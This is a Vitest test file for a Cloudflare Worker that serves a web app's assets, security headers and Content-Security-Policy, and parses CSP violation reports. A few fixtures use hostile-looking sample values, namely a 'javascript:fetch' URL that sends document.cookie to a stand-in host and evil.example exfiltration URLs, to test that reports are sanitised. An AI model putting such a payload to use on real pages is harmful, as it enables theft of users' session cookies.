import { describe, expect, it, vi } from 'vitest'
import environments from '../../../config/web-environments.json'
import { MAX_REPORT_BYTES, parseViolations, receiveReport } from './cspReport'
import {
  IMMUTABLE,
  REVALIDATE,
  contentSecurityPolicy,
  headersFile,
  securityHeaders,
  type WebProfile,
} from './headers'
import worker, { type Env } from './worker'

const CHUNK = '/_expo/static/js/web/index-8ee1e5e4af138582a02721ff781b6161.js'
// Expo's URL for it has a bare `@`; the asset server names it `%40`.
const FONT =
  '/assets/node_modules/@expo-google-fonts/inter/Inter_400Regular.079af0e2936ccb99b391ddc0bbb73dcb.ttf'
const FILES: Record<string, [string | null, string]> = {
  '/index.html': ['text/html; charset=utf-8', '<!doctype html>'],
  [CHUNK]: ['text/javascript; charset=utf-8', 'console.log(1)'],
  '/canvaskit.wasm': ['application/wasm', '\0asm'],
  '/assets/src/assets/icon.19556d01c4098119ac9127ac2681a68d.png': [
    'image/png',
    'png',
  ],
  [FONT.replace('@', '%40')]: ['font/ttf', 'ttf'],
  // The asset server can't type a file without an extension.
  '/.well-known/apple-app-site-association': [null, '{"applinks":{}}'],
  '/.well-known/assetlinks.json': ['application/json', '[]'],
}

// Behaves like Cloudflare's asset binding in single-page-application mode:
// anything it doesn't have comes back as index.html with a 200, and a path
// spelled other than its encoded form redirects there.
const assets = {
  fetch: async (input: Request | string) => {
    const request = typeof input === 'string' ? new Request(input) : input
    const { pathname } = new URL(request.url)
    const encoded = pathname
      .split('/')
      .map((segment) => encodeURIComponent(decodeURIComponent(segment)))
      .join('/')
    if (encoded !== pathname)
      return new Response(null, { status: 307, headers: { Location: encoded } })
    const [type, body] = FILES[pathname] ?? FILES['/index.html']
    const headers = new Headers({
      'Cache-Control': REVALIDATE,
      ETag: '"etag"',
    })
    if (type) headers.set('Content-Type', type)
    return new Response(request.method === 'HEAD' ? null : body, { headers })
  },
} as unknown as Fetcher

const env = (profile = 'dev'): Env => ({
  ASSETS: assets,
  WW_WEB_PROFILE: profile,
})

const call = (path: string, init?: RequestInit, profile?: string) =>
  worker.fetch(
    new Request(`https://app-dev.witnesswork.app${path}`, init) as never,
    env(profile)
  )

const dev = environments.dev as WebProfile

function expectSecurityHeaders(response: Response) {
  for (const [name, value] of Object.entries(securityHeaders(dev)))
    expect(response.headers.get(name)).toBe(value)
}

describe('files the app loads by URL', () => {
  it('serves a chunk with an immutable cache and the security headers', async () => {
    const response = await call(CHUNK)
    expect(response.status).toBe(200)
    expect(response.headers.get('Content-Type')).toMatch(/javascript/)
    expect(response.headers.get('Cache-Control')).toBe(IMMUTABLE)
    expect(response.headers.get('ETag')).toBe('"etag"')
    expect(await response.text()).toBe('console.log(1)')
    expectSecurityHeaders(response)
  })

  it('gives a missing chunk a real 404 instead of index.html', async () => {
    const response = await call('/_expo/static/js/web/index-deadbeef.js')
    expect(response.status).toBe(404)
    expect(response.headers.get('Content-Type')).toBe(
      'text/plain; charset=utf-8'
    )
    expect(response.headers.get('Cache-Control')).toBe('no-store')
    expect(await response.text()).not.toContain('<!doctype')
    expectSecurityHeaders(response)
  })

  it('answers HEAD for a missing file with an empty 404', async () => {
    const response = await call('/assets/missing.png', { method: 'HEAD' })
    expect(response.status).toBe(404)
    expect(await response.text()).toBe('')
  })

  it('keeps unhashed files revalidating', async () => {
    const response = await call('/canvaskit.wasm')
    expect(response.status).toBe(200)
    expect(response.headers.get('Content-Type')).toBe('application/wasm')
    expect(response.headers.get('Cache-Control')).toBe(REVALIDATE)
  })

  it('serves assets whose URL has an `@`, as Expo’s package assets do', async () => {
    for (const path of [FONT, FONT.replace('@', '%40')]) {
      const response = await call(path)
      expect(response.status).toBe(200)
      expect(response.headers.get('Content-Type')).toBe('font/ttf')
      expect(response.headers.get('Cache-Control')).toBe(IMMUTABLE)
      expect(await response.text()).toBe('ttf')
    }
  })

  it('caches hashed assets for good', async () => {
    const response = await call(
      '/assets/src/assets/icon.19556d01c4098119ac9127ac2681a68d.png'
    )
    expect(response.headers.get('Cache-Control')).toBe(IMMUTABLE)
  })

  it('only reads files', async () => {
    for (const method of ['POST', 'PUT', 'DELETE', 'OPTIONS']) {
      const response = await call(CHUNK, { method })
      expect(response.status).toBe(405)
      expect(response.headers.get('Allow')).toBe('GET, HEAD')
      expectSecurityHeaders(response)
    }
  })

  it('fails closed when the Worker has no known profile', async () => {
    const response = await call(CHUNK, undefined, 'staging')
    expect(response.status).toBe(500)
    expect(await response.text()).toBe('')
  })
})

describe('/.well-known', () => {
  for (const method of ['GET', 'HEAD']) {
    it(`serves Apple's app site association as JSON (${method})`, async () => {
      const response = await call('/.well-known/apple-app-site-association', {
        method,
      })
      expect(response.status).toBe(200)
      expect(response.headers.get('Content-Type')).toBe('application/json')
      expect(response.headers.get('Location')).toBeNull()
      expect(await response.text()).toBe(
        method === 'GET' ? '{"applinks":{}}' : ''
      )
      expectSecurityHeaders(response)
    })

    it(`serves Android's asset links as JSON (${method})`, async () => {
      const response = await call('/.well-known/assetlinks.json', { method })
      expect(response.status).toBe(200)
      expect(response.headers.get('Content-Type')).toBe('application/json')
    })

    it(`gives a missing file a real 404, never the app (${method})`, async () => {
      for (const path of [
        '/.well-known/webauthn',
        '/.well-known/missing',
        '/.well-known/',
      ]) {
        const response = await call(path, { method })
        expect(response.status).toBe(404)
        expect(response.headers.get('Content-Type')).toBe(
          'text/plain; charset=utf-8'
        )
        expect(response.headers.get('Cache-Control')).toBe('no-store')
        expect(await response.text()).toBe(
          method === 'GET' ? 'Not found\n' : ''
        )
      }
    })
  }

  it('serves the WebAuthn related origins as JSON once the export has them', async () => {
    FILES['/.well-known/webauthn'] = [null, '{"origins":[]}']
    try {
      const response = await call('/.well-known/webauthn')
      expect(response.status).toBe(200)
      expect(response.headers.get('Content-Type')).toBe('application/json')
    } finally {
      delete FILES['/.well-known/webauthn']
    }
  })
})

describe('headers', () => {
  const policy = (name: keyof typeof environments) =>
    contentSecurityPolicy(environments[name] as WebProfile)
  const directive = (csp: string, name: string) =>
    csp
      .split('; ')
      .find((entry) => entry.startsWith(`${name} `))
      ?.split(' ')
      .slice(1)

  it('allows each profile only its own ww-api, PostHog, Help Center and maps', () => {
    expect(directive(policy('dev'), 'connect-src')).toEqual([
      "'self'",
      'https://api-dev.witnesswork.app',
      'wss://api-dev.witnesswork.app',
      'https://ww-api-r.leviwilkerson.com',
      'https://dev.witnesswork.app',
      'https://help-search-dev.witnesswork.app',
      'https://api.revenuecat.com',
      'https://e.revenue.cat',
    ])
    expect(directive(policy('dev'), 'frame-src')).toEqual([
      'https://maps-dev.witnesswork.app',
    ])
    for (const name of ['beta', 'production'] as const) {
      expect(directive(policy(name), 'connect-src')).toEqual([
        "'self'",
        'https://api.witnesswork.app',
        'wss://api.witnesswork.app',
        'https://ww-api-r.leviwilkerson.com',
        'https://witnesswork.app',
        'https://help-search.witnesswork.app',
        'https://api.revenuecat.com',
        'https://e.revenue.cat',
      ])
      expect(directive(policy(name), 'frame-src')).toEqual([
        'https://maps.witnesswork.app',
      ])
    }
    expect(directive(policy('local'), 'connect-src')).toContain(
      'ws://localhost:8787'
    )
  })

  it('keeps every profile’s hosts out of the other environment’s CSP', () => {
    // PostHog's ingestion proxy and RevenueCat serve every environment.
    const shared = new Set([
      "'self'",
      'https://ww-api-r.leviwilkerson.com',
      'https://api.revenuecat.com',
      'https://e.revenue.cat',
    ])
    const hosts = (name: keyof typeof environments) =>
      ['connect-src', 'frame-src']
        .flatMap((name2) => directive(policy(name), name2) ?? [])
        .filter((host) => !shared.has(host))
    const production = hosts('production')
    for (const host of hosts('dev')) {
      expect(production).not.toContain(host)
      expect(host).toMatch(/-dev\.witnesswork\.app$|^https:\/\/dev\./)
    }
    for (const host of production) expect(hosts('dev')).not.toContain(host)
    expect(hosts('beta')).toEqual(production)
    // Hosts the app moved off (ADR 0042) are gone everywhere.
    for (const name of Object.keys(
      environments
    ) as (keyof typeof environments)[])
      for (const old of [
        'https://leviwilkerson.com',
        'help-search.leviwilkerson.com',
        'ww-proxy.leviwilkerson.com',
      ])
        expect(policy(name)).not.toContain(old)
  })

  it('runs only the app’s own code', () => {
    for (const name of Object.keys(
      environments
    ) as (keyof typeof environments)[]) {
      const csp = policy(name)
      expect(directive(csp, 'default-src')).toEqual(["'self'"])
      expect(directive(csp, 'script-src')).toEqual([
        "'self'",
        "'wasm-unsafe-eval'",
      ])
      expect(directive(csp, 'worker-src')).toEqual(["'self'"])
      expect(directive(csp, 'media-src')).toEqual(["'self'", 'blob:'])
      expect(directive(csp, 'require-trusted-types-for')).toEqual(["'script'"])
      // Named policies, each created once; no `default` policy, no duplicates.
      expect(directive(csp, 'trusted-types')).toEqual([
        'ww-chunks',
        'ProseMirrorClipboard',
      ])
      expect(directive(csp, 'frame-ancestors')).toEqual(["'none'"])
      expect(directive(csp, 'object-src')).toEqual(["'none'"])
      expect(directive(csp, 'base-uri')).toEqual(["'none'"])
      expect(csp).toMatch(/; report-uri \/_csp-report$/)
      expect(csp).not.toContain('report-to')
      expect(csp).not.toMatch(
        /'unsafe-eval'|\*|revenuecat[^;]*script|stripe|posthog\.com/
      )
    }
  })

  it('enforces in every deployed environment', () => {
    // Switching one back to report-only is an emergency measure
    // (docs/web-hosting.md, "CSP enforcement"), so it changes this test too.
    for (const name of ['dev', 'beta', 'production'] as const) {
      const headers = securityHeaders(environments[name] as WebProfile)
      expect(headers['Content-Security-Policy']).toBe(policy(name))
      expect(headers).not.toHaveProperty('Content-Security-Policy-Report-Only')
    }
    const reporting = securityHeaders({ ...dev, csp: 'report-only' })
    expect(reporting['Content-Security-Policy-Report-Only']).toBe(policy('dev'))
    expect(reporting).not.toHaveProperty('Content-Security-Policy')
  })

  it('hardens the origin without cross-origin isolation', () => {
    const headers = securityHeaders(dev)
    expect(headers).toMatchObject({
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
      'X-Content-Type-Options': 'nosniff',
      'Referrer-Policy': 'no-referrer',
      'Cross-Origin-Opener-Policy': 'same-origin',
      'X-Frame-Options': 'DENY',
    })
    expect(headers['Permissions-Policy']).toContain('camera=(self)')
    expect(headers['Permissions-Policy']).toContain('microphone=(self)')
    expect(headers['Permissions-Policy']).toContain('geolocation=(self)')
    expect(headers).not.toHaveProperty('Cross-Origin-Embedder-Policy')
  })

  it('writes the same set into _headers for every asset path', () => {
    const file = headersFile(dev).split('\n')
    expect(file[0]).toBe('/*')
    expect(file.slice(1).filter(Boolean)).toEqual(
      Object.entries(securityHeaders(dev)).map(([n, v]) => `  ${n}: ${v}`)
    )
  })
})

describe('CSP reports', () => {
  const report = (body: unknown, type = 'application/csp-report') =>
    new Request('https://app-dev.witnesswork.app/_csp-report', {
      method: 'POST',
      headers: { 'Content-Type': type },
      body: typeof body === 'string' ? body : JSON.stringify(body),
    })

  it('logs one compact, stripped line per violation and answers 204', async () => {
    const log = vi.fn()
    const response = await receiveReport(
      report({
        'csp-report': {
          'document-uri':
            'https://app-dev.witnesswork.app/accounts/handoff?code=1#secret',
          'violated-directive': 'connect-src',
          'effective-directive': 'connect-src',
          'blocked-uri': 'https://evil.example/collect?data=private',
          'source-file': `https://app-dev.witnesswork.app${CHUNK}?v=1`,
          'line-number': 12,
          'column-number': 3,
          'script-sample': 'private note text',
          disposition: 'report',
        },
      }),
      log
    )
    expect(response.status).toBe(204)
    expect(log).toHaveBeenCalledOnce()
    const line = JSON.parse(log.mock.calls[0][0])
    expect(line).toEqual({
      event: 'csp-violation',
      directive: 'connect-src',
      disposition: 'report',
      blocked: 'https://evil.example/collect',
      document: 'https://app-dev.witnesswork.app/accounts/handoff',
      source: `https://app-dev.witnesswork.app${CHUNK}`,
      line: 12,
      column: 3,
    })
    expect(log.mock.calls[0][0]).not.toMatch(/private|secret|code=/)
  })

  it('reads Reporting API batches and keeps only the Trusted Types sink', () => {
    const violations = parseViolations([
      {
        type: 'csp-violation',
        body: {
          documentURL: 'https://app-dev.witnesswork.app/',
          effectiveDirective: 'require-trusted-types-for',
          blockedURL: 'trusted-types-sink',
          sample: 'Element innerHTML|<p>Visit with Ana at 5</p>',
          disposition: 'report',
        },
      },
      { type: 'deprecation', body: { id: 'x' } },
      {
        type: 'csp-violation',
        body: {
          documentURL: 'https://app-dev.witnesswork.app/',
          effectiveDirective: 'img-src',
          blockedURL: 'data:image/png;base64,AAAA',
          disposition: 'report',
        },
      },
    ])
    expect(violations).toEqual([
      expect.objectContaining({
        directive: 'require-trusted-types-for',
        blocked: 'trusted-types-sink',
        sink: 'Element innerHTML',
      }),
      expect.objectContaining({ directive: 'img-src', blocked: 'data' }),
    ])
    expect(JSON.stringify(violations)).not.toContain('Ana')
  })

  it('keeps only the scheme of URLs that have no origin', () => {
    const blocked = (blockedURL: string) =>
      parseViolations([
        {
          type: 'csp-violation',
          body: {
            documentURL: 'https://app-dev.witnesswork.app/',
            effectiveDirective: 'script-src-elem',
            blockedURL,
          },
        },
      ])[0].blocked
    expect(blocked('mailto:someone@example.com')).toBe('mailto')
    expect(blocked('javascript:fetch("//x/"+document.cookie)')).toBe(
      'javascript'
    )
    expect(blocked('file:///Users/someone/notes.txt')).toBe('file')
    expect(blocked('chrome-extension://abcdef/content.js')).toBe(
      'chrome-extension'
    )
  })

  it('reads the single Reporting API report WebKit posts to report-uri', () => {
    expect(
      parseViolations({
        type: 'csp-violation',
        url: 'https://app-dev.witnesswork.app/',
        body: {
          documentURL: 'https://app-dev.witnesswork.app/',
          effectiveDirective: 'require-trusted-types-for',
          blockedURL: 'trusted-types-sink',
          sample: 'Function|return this',
          disposition: 'report',
        },
      })
    ).toEqual([
      expect.objectContaining({
        directive: 'require-trusted-types-for',
        sink: 'Function',
      }),
    ])
  })

  it('drops reports about other sites and caps each batch', async () => {
    const log = vi.fn()
    const one = (documentURL: string) => ({
      type: 'csp-violation',
      body: {
        documentURL,
        effectiveDirective: 'img-src',
        blockedURL: 'inline',
      },
    })
    await receiveReport(
      report(
        [
          one('https://evil.example/'),
          one('https://app-dev.witnesswork.app.evil.example/'),
          ...Array.from({ length: 50 }, () =>
            one('https://app-dev.witnesswork.app/')
          ),
        ],
        'application/reports+json'
      ),
      log
    )
    expect(log).toHaveBeenCalledTimes(8)
  })

  it('refuses oversized, mistyped, malformed and non-POST reports', async () => {
    const log = vi.fn()
    const big = 'x'.repeat(MAX_REPORT_BYTES + 1)
    expect((await receiveReport(report(big), log)).status).toBe(413)
    const streamed = new Request(
      'https://app-dev.witnesswork.app/_csp-report',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/csp-report' },
        body: new ReadableStream({
          start(controller) {
            for (let i = 0; i < 40; i++)
              controller.enqueue(new TextEncoder().encode('x'.repeat(1024)))
            controller.close()
          },
        }),
        duplex: 'half',
      } as RequestInit
    )
    expect((await receiveReport(streamed, log)).status).toBe(413)
    expect((await receiveReport(report('{}', 'text/plain'), log)).status).toBe(
      415
    )
    expect((await receiveReport(report('{nope'), log)).status).toBe(400)
    const get = await call('/_csp-report')
    expect(get.status).toBe(405)
    expect(get.headers.get('Allow')).toBe('POST')
    expectSecurityHeaders(get)
    expect(log).not.toHaveBeenCalled()
  })

  it('answers through the Worker with the security headers', async () => {
    const response = await call('/_csp-report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/reports+json' },
      body: '[]',
    })
    expect(response.status).toBe(204)
    expectSecurityHeaders(response)
  })
})
